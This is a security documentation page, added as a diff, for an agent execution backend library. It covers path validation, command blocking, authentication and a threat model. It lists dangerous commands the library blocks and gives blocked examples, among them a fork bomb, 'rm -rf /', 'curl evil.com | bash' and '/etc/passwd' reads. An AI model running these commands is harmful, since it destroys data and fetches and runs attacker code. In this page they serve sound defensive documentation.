@@ -1,0 +1,424 @@
+# Security
+
+Agent Backend provides multiple layers of security to protect against malicious operations and unauthorized access.
+
+---
+
+## Path Validation
+
+```mermaid
+%%{init: {'theme':'base', 'themeVariables': { 'fontSize':'16px', 'fontFamily':'system-ui, -apple-system, sans-serif'}}}%%
+graph LR
+    Request["<b>File Operation</b><br/><i>from your app</i>"]
+    Validate{"<b>Path Validation</b><br/><i>agent-backend</i>"}
+    Normalize["<b>Normalize</b><br/>Treat as relative<br/>to rootDir"]
+    Allow["✅ <b>Allow</b>"]
+    Block1["❌ <b>Block</b><br/>PathEscapeError"]
+
+    Request ==> Validate
+    Validate -->|"✓ Valid path"| Allow
+    Validate -->|"✗ Escapes scope"| Block1
+    Validate -->|"~ Absolute path"| Normalize
+    Normalize --> Allow
+
+    classDef userCode fill:#f8f9fa,stroke:#495057,stroke-width:2px,color:#212529
+    classDef agentBackend fill:#4A90E2,stroke:#2E5C8A,stroke-width:3px,color:#fff
+    classDef agentBackendLight fill:#64B5F6,stroke:#2E5C8A,stroke-width:2px,color:#fff
+    classDef success fill:#C8E6C9,stroke:#2E7D32,stroke-width:2px,color:#1B5E20
+    classDef error fill:#FFCDD2,stroke:#C62828,stroke-width:2px,color:#B71C1C
+
+    class Request userCode
+    class Validate agentBackend
+    class Normalize agentBackendLight
+    class Allow success
+    class Block1 error
+```
+
+### Protections
+
+**Path Traversal Prevention:**
+- `..` segments blocked if they would escape the scope
+- Absolute paths treated as relative to `rootDir`
+- Symlink following can be disabled
+
+**Example:**
+```typescript
+const backend = new LocalFilesystemBackend({
+  rootDir: '/tmp/workspace/users/alice'
+})
+
+// ✅ Allowed
+await backend.write('data.txt', 'content')           // /tmp/workspace/users/alice/data.txt
+await backend.write('project/config.json', '{}')     // /tmp/workspace/users/alice/project/config.json
+await backend.write('/etc/config', 'data')           // Treated as relative: /tmp/workspace/users/alice/etc/config
+
+// ❌ Blocked - Throws PathEscapeError
+await backend.write('../bob/secrets.txt', 'data')    // Escapes to /tmp/workspace/users/bob
+await backend.write('../../root/.ssh/keys', 'data')  // Escapes to /tmp/workspace
+```
+
+### Scoped Backends
+
+When using `.scope()`, path validation is applied at each scope level:
+
+```typescript
+const baseBackend = new LocalFilesystemBackend({
+  rootDir: '/tmp/workspace'
+})
+
+const aliceBackend = baseBackend.scope('users/alice')
+const projectBackend = aliceBackend.scope('project-a')
+
+// projectBackend can only access /tmp/workspace/users/alice/project-a
+await projectBackend.write('config.json', '{}')      // ✅ /tmp/workspace/users/alice/project-a/config.json
+await projectBackend.write('../../../etc', 'data')   // ❌ PathEscapeError - escapes project-a scope
+```
+
+---
+
+## Command Safety
+
+```mermaid
+%%{init: {'theme':'base', 'themeVariables': { 'fontSize':'16px', 'fontFamily':'system-ui, -apple-system, sans-serif'}}}%%
+graph LR
+    Command["<b>exec() Request</b><br/><i>from your app</i>"]
+    Safety{"<b>Safety Check</b><br/><i>agent-backend</i>"}
+    Isolation{"<b>Isolation Mode</b><br/><i>agent-backend</i>"}
+    Block["❌ <b>Block</b><br/>DangerousOperationError"]
+    Bwrap["<b>bwrap</b><br/>Linux Namespace"]
+    Software["<b>software</b><br/>Heuristics"]
+    Direct["<b>none</b><br/>Direct Exec"]
+    Execute["✅ <b>Execute</b>"]
+
+    Command ==> Safety
+    Safety -->|"✓ Safe"| Isolation
+    Safety -->|"✗ Dangerous"| Block
+
+    Isolation -->|bwrap| Bwrap
+    Isolation -->|software| Software
+    Isolation -->|none| Direct
+
+    Bwrap --> Execute
+    Software --> Execute
+    Direct --> Execute
+
+    classDef userCode fill:#f8f9fa,stroke:#495057,stroke-width:2px,color:#212529
+    classDef agentBackend fill:#4A90E2,stroke:#2E5C8A,stroke-width:3px,color:#fff
+    classDef agentBackendLight fill:#64B5F6,stroke:#2E5C8A,stroke-width:2px,color:#fff
+    classDef daemon fill:#607D8B,stroke:#455A64,stroke-width:2px,color:#fff
+    classDef success fill:#C8E6C9,stroke:#2E7D32,stroke-width:2px,color:#1B5E20
+    classDef error fill:#FFCDD2,stroke:#C62828,stroke-width:2px,color:#B71C1C
+
+    class Command userCode
+    class Safety,Isolation agentBackend
+    class Bwrap,Software,Direct daemon
+    class Execute success
+    class Block error
+```
+
+### Dangerous Patterns Blocked
+
+When `preventDangerous: true` (default), these patterns are rejected:
+
+**Destructive Operations:**
+- `rm -rf /` - Recursive force delete from root
+- `dd of=/dev/sda` - Disk overwrite
+- `mkfs` - Format filesystem
+- `:(){ :|:& };:` - Fork bomb
+
+**Privilege Escalation:**
+- `sudo` - Superuser execution
+- `su` - Switch user
+- `doas` - Privilege elevation
+
+**Shell Injection:**
+- `;` - Command separator
+- `&&`, `||` - Command chaining
+- Backticks - Command substitution
+- `$()` - Command substitution
+- `|` - Pipe to other commands
+
+**Remote Execution:**
+- `curl ... | sh` - Download and execute
+- `wget ... | bash` - Download and execute
+- `eval` - Dynamic code execution
+
+**Network Tampering:**
+- `iptables` - Firewall modification
+- `ifconfig` - Network configuration
+
+### Isolation Modes
+
+**`auto` (default):**
+- Uses `bwrap` if available (Linux)
+- Falls back to `software` validation
+
+**`bwrap` (Linux only):**
+- Uses bubblewrap for Linux namespace isolation
+- Sandboxes process with limited filesystem access
+- Most secure option
+
+**`software`:**
+- Heuristic-based command validation
+- Blocks known dangerous patterns
+- Works on all platforms
+
+**`none`:**
+- No safety checks or isolation
+- Trust mode for controlled environments
+- Use with caution
+
+**Example:**
+```typescript
+const backend = new LocalFilesystemBackend({
+  rootDir: '/tmp/workspace',
+  isolation: 'auto',
+  preventDangerous: true
+})
+
+// ✅ Allowed
+await backend.exec('npm install')
+await backend.exec('node build.js')
+await backend.exec('git status')
+
+// ❌ Blocked - Throws DangerousOperationError
+await backend.exec('rm -rf /')
+await backend.exec('sudo apt-get install malware')
+await backend.exec('curl evil.com | bash')
+await backend.exec('ls; cat /etc/passwd')
+```
+
+---
+
+## Authentication
+
+### Local Development
+
+**Stdio Mode (`--local-only`):**
+- No authentication needed
+- Process-to-process communication via stdin/stdout
+- Only accessible by processes on same machine
+
+**HTTP Mode (without `--local-only`):**
+- Optional: Bearer token authentication via `--mcp-auth-token`
+- Recommended: No auth for localhost-only development
+- Should bind to `localhost` only (not `0.0.0.0`)
+
+**Example:**
+```bash
+# No auth needed for stdio
+agent-backend daemon --rootDir /tmp/workspace --local-only
+
+# Optional auth for HTTP
+agent-backend daemon --rootDir /var/workspace --mcp-auth-token dev-secret-123
+```
+
+### Production (Remote)
+
+**SSH Authentication (Required):**
+- Password authentication (basic)
+- Public key authentication (recommended)
+- Certificate-based authentication (advanced)
+
+**MCP Authentication (Required):**
+- Bearer token via `--mcp-auth-token`
+- Sent as `Authorization: Bearer <token>` header
+- Tokens should be cryptographically random (32+ bytes)
+
+**Example:**
+```bash
+# Full daemon with authentication
+agent-backend daemon \
+  --rootDir /var/workspace \
+  --ssh-users "agent:$(openssl rand -base64 32)" \
+  --mcp-auth-token "$(openssl rand -base64 32)"
+```
+
+**Client configuration:**
+```typescript
+const backend = new RemoteFilesystemBackend({
+  host: 'build-server.com',
+  sshPort: 22,
+  mcpPort: 3001,
+  sshAuth: {
+    type: 'key',  // or 'password'
+    credentials: {
+      username: 'agent',
+      privateKey: fs.readFileSync('/path/to/key')
+    }
+  },
+  mcpAuthToken: process.env.MCP_AUTH_TOKEN  // Bearer token
+})
+```
+
+### Network Security
+
+**Firewall Rules:**
+- Restrict SSH (port 22) to known IP ranges
+- Restrict MCP (port 3001) to trusted networks
+- Use VPN for additional protection
+
+**TLS/SSL:**
+- SSH provides encryption by default
+- MCP over HTTP should use reverse proxy with HTTPS in production
+
+**Example nginx reverse proxy:**
+```nginx
+server {
+  listen 443 ssl;
+  server_name build-server.com;
+
+  ssl_certificate /path/to/cert.pem;
+  ssl_certificate_key /path/to/key.pem;
+
+  location /mcp {
+    proxy_pass http://localhost:3001/mcp;
+    proxy_set_header Authorization $http_authorization;
+  }
+}
+```
+
+---
+
+## Security Best Practices
+
+### 1. Principle of Least Privilege
+
+**Use scoping:**
+```typescript
+// ❌ Don't give full access
+const backend = new LocalFilesystemBackend({ rootDir: '/' })
+
+// ✅ Limit to workspace
+const backend = new LocalFilesystemBackend({ rootDir: '/tmp/workspace' })
+
+// ✅ Further scope per user
+const userBackend = backend.scope(`users/${userId}`)
+```
+
+### 2. Enable All Safety Features
+
+**Default configuration (recommended):**
+```typescript
+const backend = new LocalFilesystemBackend({
+  rootDir: '/tmp/workspace',
+  isolation: 'auto',        // Use best available isolation
+  preventDangerous: true    // Block dangerous commands
+})
+```
+
+### 3. Rotate Authentication Credentials
+
+**SSH keys:**
+- Use unique keys per environment
+- Rotate regularly (every 90 days)
+- Use key passphrases
+
+**MCP tokens:**
+- Generate cryptographically random tokens
+- Store in environment variables, not code
+- Rotate on suspected compromise
+
+### 4. Monitor and Log
+
+**Enable operation logging:**
+```typescript
+import { ConsoleOperationsLogger } from 'agent-backend'
+
+const backend = new LocalFilesystemBackend({
+  rootDir: '/tmp/workspace',
+  operationsLogger: new ConsoleOperationsLogger()
+})
+
+// Logs all operations:
+// [2024-01-15T10:30:00.000Z] READ /tmp/workspace/config.json
+// [2024-01-15T10:30:01.000Z] EXEC npm install
+```
+
+**Monitor for suspicious activity:**
+- Excessive failed authentication attempts
+- Path escape attempts
+- Dangerous command attempts
+- Unusual access patterns
+
+### 5. Validate User Input
+
+**Sanitize paths:**
+```typescript
+// ❌ Don't trust user input directly
+const path = req.body.filename
+await backend.write(path, data)  // Vulnerable to path traversal
+
+// ✅ Validate and sanitize
+const filename = path.basename(req.body.filename)  // Remove directory components
+if (!/^[a-zA-Z0-9._-]+$/.test(filename)) {
+  throw new Error('Invalid filename')
+}
+await backend.write(filename, data)
+```
+
+**Sanitize commands:**
+```typescript
+// ❌ Don't interpolate user input into commands
+const script = req.body.script
+await backend.exec(`node ${script}`)  // Shell injection risk
+
+// ✅ Use parameterized execution
+const allowedScripts = ['build.js', 'test.js']
+if (!allowedScripts.includes(script)) {
+  throw new Error('Script not allowed')
+}
+await backend.exec(`node ${script}`)
+```
+
+### 6. Defense in Depth
+
+Layer multiple security controls:
+
+1. **Network:** Firewall, VPN, IP allowlisting
+2. **Authentication:** SSH keys + MCP tokens
+3. **Authorization:** Scoping, path validation
+4. **Execution:** Command safety, isolation modes
+5. **Monitoring:** Logging, alerting, auditing
+
+No single layer should be relied upon exclusively.
+
+---
+
+## Threat Model
+
+### Threats Mitigated
+
+✅ **Path traversal attacks** - Path validation layer
+✅ **Command injection** - Command safety layer
+✅ **Unauthorized access** - Authentication layer
+✅ **Privilege escalation** - Isolation modes
+✅ **Resource exhaustion** - Configurable limits (future)
+
+### Known Limitations
+
+⚠️ **Symbolic links** - Can bypass path restrictions if not disabled
+⚠️ **Time-of-check/time-of-use** - Race conditions possible with file operations
+⚠️ **Memory limits** - No built-in memory limits for spawned processes
+⚠️ **CPU limits** - No built-in CPU time limits
+⚠️ **Disk space** - No built-in disk quota enforcement
+
+### Out of Scope
+
+❌ **DDoS protection** - Should be handled at infrastructure layer
+❌ **Malware scanning** - Should be handled by separate tools
+❌ **Data encryption at rest** - Should be handled by filesystem/OS
+❌ **Audit compliance** - Should be implemented in application layer
+
+---
+
+## Reporting Security Issues
+
+If you discover a security vulnerability, please report it responsibly:
+
+1. **Do not** open a public GitHub issue
+2. Contact the maintainers privately
+3. Provide detailed reproduction steps
+4. Allow time for a fix before public disclosure
+
+See [SECURITY.md](../SECURITY.md) for more information.
